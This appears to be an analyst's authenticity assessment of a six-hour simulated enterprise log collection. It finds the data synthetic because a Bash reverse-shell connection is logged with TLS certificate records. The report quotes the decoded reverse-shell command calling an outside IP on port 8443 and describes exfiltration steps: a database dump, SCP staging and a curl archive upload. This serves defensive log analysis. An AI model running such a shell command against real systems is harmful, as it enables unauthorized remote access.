# Threat Hunter — Authenticity Assessment

## Verdict

**Assessment:** Synthetic
**Verdict Confidence:** 91
**Synthetic-Confidence Score:** 76

## Executive Summary

This is a substantial, usable six-hour enterprise collection with credible Windows, Linux, macOS, proxy, firewall and network pivots. My synthetic verdict rests principally on one demonstrated protocol contradiction: the exact connection owned by a visible Bash `/dev/tcp` reverse shell is also reported as a successfully established TLS session with a certificate. Other investigated SSH, file-transfer and upload paths have convincing identity and timing continuity, so I have not extrapolated that defect into a claim that the whole collection is incoherent.

## Evidence For Synthetic

- [hard_contradiction] `WEB-EXT-01.meridianhcs.local/ecar.json`, records 875–880, connects Apache's `www-data` child Bash PID `2702806` to `10.10.3.10:56738 -> 45.33.32.30:8443` at `2026-11-02T14:20:02.541Z`. The parent command's Base64 payload decodes to `bash -c "bash -i >& /dev/tcp/45.33.32.30/8443 0>&1"`; this opens an ordinary TCP socket and does not implement TLS. Nevertheless, the exact tuple is Zeek UID `CgR5Lvle5WdWRKjoSq`, with `service=ssl` in `zeek-dmz/conn.json:1955`, and `zeek-dmz/ssl.json:830` explicitly reports `TLSv12`, `TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256`, `established=true`, and certificate FUID `FJ3IISWWDMX6aOU0lt`. `zeek-dmz/files.json:355` independently describes that FUID as a 1,224-byte SSL certificate. A TLS certificate exchange cannot be a native effect of that Bash socket. This is stronger than a port-based classification suspicion: the protocol and certificate records assert an actual handshake on the joined connection. No TLS intermediary is visible in the inspected chain.

## Evidence For Real

- The collection contains 23 endpoint directories: 10 with Security/Sysmon XML, 11 with Linux syslog, and two with macOS Endpoint Security and Unified Log exports. There are 39,270 normalized endpoint records, 19,224 Windows Security events, 12,086 Sysmon events, and 24,092 Zeek connection rows across three sensor locations. This is enough heterogeneous background to support actual hunting; the suspicious actions are embedded among DNS, service, browser, mail, scanner and administrative activity.
- SSH transport-before-authentication is well represented in the examined database path. `zeek-db/conn.json:400` opens `10.10.2.30:44788 -> 10.10.4.10:22` at `18:15:03.871479Z`; database syslog records the same peer at `18:15:07.665097Z`, accepts root at `18:15:14.021042Z`, opens PAM at `18:15:14.103669Z`, and the normalized LOGIN follows at `18:15:14.223Z`. The source SSH process exists before those observations.
- The reverse SCP transfer also joins correctly. `zeek-db/conn.json:402` and `zeek-core/conn.json:11519` share the tuple `10.10.4.10:53915 -> 10.10.2.30:22`, with separate sensor UIDs and slightly different timestamps. APP-INT-01 syslog accepts that exact source tuple before its normalized received-file CREATE.
- The Windows archive upload has a useful multi-source chain: Sysmon PID `6784` with the curl command, normalized archive READ, proxy `POST` with `ssl-inspect`, and an upstream TLS connection with matching SNI and a large outbound byte count. Unlike the Bash case, curl and an inspecting proxy can technically produce these protocol observations.
- Native Windows Security events include account, authentication, service and scheduled-task details that materially support pivots. For example, DC-01's `4697` and `4698` name `DeviceSyncSvc` and `\Microsoft\Windows\Maintenance\DeviceSync`, and the latter includes task XML pointing to the same executable as the process evidence.

## Detailed Analysis

### Scope, method and collection boundaries

I inspected only the assigned data and briefing. I enumerated source files, parsed all normalized endpoint JSON, parsed the Windows XML for source counts and selected native events, inspected representative network and alert records, and followed several exact-tuple and exact-process pivots. The normalized records span `2026-11-02T13:00:00.756Z` through `18:59:50.518Z`, a six-hour slice. Network addressing suggests workstation `10.10.1.x`, internal/server `10.10.2.x`, DMZ/proxy `10.10.3.x`, and database `10.10.4.x` segments. These are inferred roles, supported by names and activity, rather than an assumed inventory.

There are 12,961 core, 10,669 DMZ and 462 database Zeek connection rows. These are sensor observations, not necessarily distinct connections; the database SSH examples appear at both core and database vantage points. The dataset also contains 4,351 proxy access rows, 811 WEB-EXT-01 access rows, 25,855 ASA rows, and 158 Snort alert rows. Such volumes and source diversity are plausible for this bounded scope. I do not infer missing collection merely because another product or event family could have helped.

### Web foothold: actionable evidence and protocol disagreement

The visible upload request is `WEB-EXT-01/web_access.log:477`: external peer `185.70.41.45`, `POST /ehr/admin/upload.php`, HTTP `200`, at `14:19:59 +0000`. Normalized process record 875 at `14:19:58.705Z` has Apache PID `23966` spawning Bash PID `2702804` as `www-data`. Its children include `base64 -d` PID `2702805` and Bash PID `2702806`. A web access timestamp often describes completion and has only second precision, so the process record preceding that access timestamp is not, by itself, an impossible request ordering.

The encoded bytes are visible in the process command. I decoded them as text only; no logged command was executed. The result specifies the raw `/dev/tcp` reverse shell quoted above. Endpoint FLOW record 880 attributes the outbound socket to the exact child object `9420c3c3-732c-4b41-873a-5a42a7d3150a` and PID `2702806`. Zeek's tuple and time place the flow at `14:20:02.445721Z`, approximately 95 milliseconds before the endpoint observation. This is a reasonable observation difference.

What fails is application-layer truth, not timing. Zeek SSL record 830, at `14:20:02.609424Z`, asserts a negotiated TLS protocol, cipher and established status on this UID. Its certificate reference resolves to an SSL-source files record. Merely choosing destination port 8443 cannot make a Bash socket speak TLS. The data would require an additional mechanism such as a demonstrated encryption wrapper or intermediary to reconcile those facts. I did not find one in this visible process chain. The connection closes after about 20.106 seconds and Bash terminates at `14:20:28.228Z`; those lifecycle facts are plausible and do not cure the protocol contradiction.

This is one identified contradictory connection, not a claim that all 3,199 DMZ SSL rows are wrong. Its impact is high because it directly undermines the technical operation of a hunted foothold, while its limited demonstrated scope keeps my score below the highest rubric band.

### Database access and staging: successful pivots

APP-INT-01 creates root SSH PID `2983813` at `18:14:54.656Z`, command `ssh root@DB-PROD-01.meridianhcs.local`. Its outbound endpoint FLOW is at `18:15:05.466Z`; the receiving database FLOW is at `18:15:04.833Z`. Both use source port `44788`. Database syslog and normalized login then establish root session `362`, Logon ID `0x1185f8fa`, followed by a root shell and database tools.

The database creates `/tmp/rpt_0318.sql` associated with mysqldump at `18:15:21.792Z`, creates the compressed artifact at `18:15:43.523Z`, and reads that same compressed artifact during SCP at `18:16:04.440Z`. I do not treat the absence of a shell redirection in a child process argument string as proof that mysqldump could not have written the file: redirection can be established by the invoking shell and is not an executable argument.

The SCP PID `1089125` connects back to APP-INT-01 using port `53915`. APP syslog records connection at `18:15:58.370179Z`, accepted publickey at `18:16:03.367554Z`, then PAM opening. APP normalized LOGIN is at `18:16:05.142Z`, and its received-file CREATE is at `18:16:25.723Z`, path `/tmp/.cache/rpt_0318.sql.gz`, with receiver `sshd: root@notty`. APP's later smbclient reads that exact artifact at `18:19:17.773Z`. This is technically workable staging and transfer, with no need to assume a shell for the noninteractive copy session.

### Windows collection and upload

WS-AJOHNSON-01 creates archive `C:\ProgramData\Microsoft\cache_7f3a.zip` at `18:01:44.662Z`, associated with the visible Compress-Archive PID `6776`. At `18:25:22.0324049Z`, Sysmon Event 1 identifies curl PID `6784`, account `MERIDIANHCS\aisha.johnson`, Logon ID `0x27c991a`, and an upload command naming that archive and `https://api.westbridge-services.net/upload/telemetry/7f3a2b19` through `10.10.3.20:8080`. The normalized FILE READ follows at `18:25:25.271Z` and preserves the archive identity.

Proxy access record 4028 at `18:25:26` records that URI as a POST, account aisha.johnson, `curl/8.4.0`, `cs_bytes=18783258`, `proxy_action=ssl-inspect`, and `ssl_bump=bump`. The upstream DMZ connection is UID `C4DjQdw8HBHLFbCNPpc`, tuple `10.10.3.20:36021 -> 45.33.32.30:443`, at `18:25:27.395060Z`, with 18,825,920 originator bytes. SSL record 2950 has the matching server name. Different proxy/client/upstream byte totals are expected because these are different accounting scopes. This path demonstrates why the TLS claim is plausible for curl/proxy but implausible for the direct Bash connection.

### Noise, platform interpretation and limits

The normalized source mix is led by 29,023 FLOW CONNECT records, followed by 2,630 PROCESS CREATE and 2,496 PROCESS TERMINATE records, 2,092 MODULE LOAD records, and 955 USER_SESSION LOGIN records. The login/logoff totals are not a contradiction: some sessions can cross the collection boundary, and platform/source semantics differ. An exact-object scan found no dependent activity more than five seconds after a visible normalized process termination; this was a bounded consistency check, not proof of every lifecycle's correctness.

Ten Linux hosts expose 36 pairs of sysstat shell/collector executions on a ten-minute schedule. Scheduled collectors legitimately repeat; I have not scored that regularity as synthetic. Database process activity differs materially: its 32 process creates contain 29 distinct command strings. The sparse laptop and macOS source volumes alone do not establish unrealistic collection.

The two Mac directories contain 310 Endpoint Security notifications, five Unified Log records and zsh histories. The visible MAC-MROSS-01 Unified Log policy message at `15:41:38.735570Z` says policy would not allow `MeetingAssist` PID `62451`; I have not interpreted it as proof that the application executed. Likewise, these Unified Log exports are not interchangeable with normalized endpoint records. No macOS-specific native-schema defect is asserted in this report.

Clean attack progression, complete joins, absent retries and the ability to narrate the incident did not contribute to the verdict. The findings concern actual protocol semantics and observable collection facts.

## Synthetic Indicator Summary

| Category | Affected source family | Demonstrated scope | Score impact |
|---|---|---|---|
| hard_contradiction | Linux normalized process/FLOW; Zeek conn/SSL/files | One exact connection: `10.10.3.10:56738 -> 45.33.32.30:8443`, UID `CgR5Lvle5WdWRKjoSq` | High: visible raw Bash TCP activity is given successful TLS and certificate evidence without a visible TLS mechanism. Principal basis for score 76. |

No other examined source-family volume or timing pattern was sufficiently established to add a separate synthetic indicator. Possible unobserved infrastructure remains an alternative explanation for the principal defect, but the supplied records do not support it.

## Realism Score by Category

- **Field format accuracy:** 8 — Representative native XML, structured JSON and source text are usable; the strongest defect is semantic rather than a parser problem.
- **Temporal patterns:** 8 — Examined SSH, file and upload sequences have plausible ordering and source observation differences.
- **Cross-source correlation:** 6 — Several valuable exact pivots work; one critical pivot links mutually incompatible protocol claims.
- **Behavioral realism:** 7 — Administrative, transfer and upload commands are technically credible, with the direct reverse shell/TLS mismatch materially lowering this category.
- **Environmental consistency:** 8 — Mixed-platform roles, segmented sensor views and background source volumes are plausible within the stated slice.

## Recommendations

- If this were synthetic, derive application-layer protocol evidence from the actual visible mechanism. Keep the `/dev/tcp` reverse shell as plain TCP without TLS handshake/certificate records, or model a real TLS-capable implementation with its corresponding process and ownership evidence.
- If encryption is intentionally supplied by an intermediary, make that mechanism and the two connection legs technically distinguishable. Do not attach the intermediary's negotiated protocol to an endpoint raw socket under an indistinguishable tuple without evidence supporting the transformation.
- Retain the demonstrated SSH session, SCP receiver, durable file-identity and proxy accounting relationships. Validate protocol semantics on these joined paths as rigorously as tuple and timestamp continuity.
